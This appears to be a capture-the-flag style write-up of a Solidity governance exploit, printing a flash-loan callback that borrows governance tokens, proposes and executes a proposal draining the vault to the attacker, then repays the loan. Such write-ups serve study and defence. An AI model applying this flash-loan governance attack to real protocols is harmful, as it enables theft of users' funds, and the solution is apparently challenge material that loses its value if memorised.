# Exploit Summary

```solidity id="jlwm98"
function receiveCustody(uint256 amount)
    external
    override
{
    uint256 vaultBalance =
        address(council.vault()).balance;

    uint256 proposalId =
        council.propose(player, vaultBalance);

    council.execute(proposalId);

    token.transfer(address(custody), amount);
}
```

The exploit borrows the entire governance token balance from the custody contract, creates a proposal while temporarily holding more than 25% of the token supply, immediately executes the proposal to transfer all funds from the vault to the attacker, and finally returns the borrowed tokens before the custody contract verifies repayment. Although the borrowed tokens exist only briefly, the governance snapshot permanently records the attacker's temporary voting power, allowing full control over the protocol.
